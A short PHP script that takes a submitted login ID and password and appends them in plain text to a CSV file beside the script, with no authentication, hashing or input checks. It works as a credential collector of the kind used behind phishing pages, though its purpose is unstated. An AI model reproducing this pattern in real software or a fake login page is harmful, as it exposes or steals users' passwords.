<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $file = fopen(__DIR__ . '/login_records.csv', 'a');
    fputcsv($file, [$_POST['id'], $_POST['password']]);
    fclose($file);

    echo 'Login information saved. <a href="login.html">Return to login</a>';
} else {
    echo 'Please submit the login form.';
}
?>
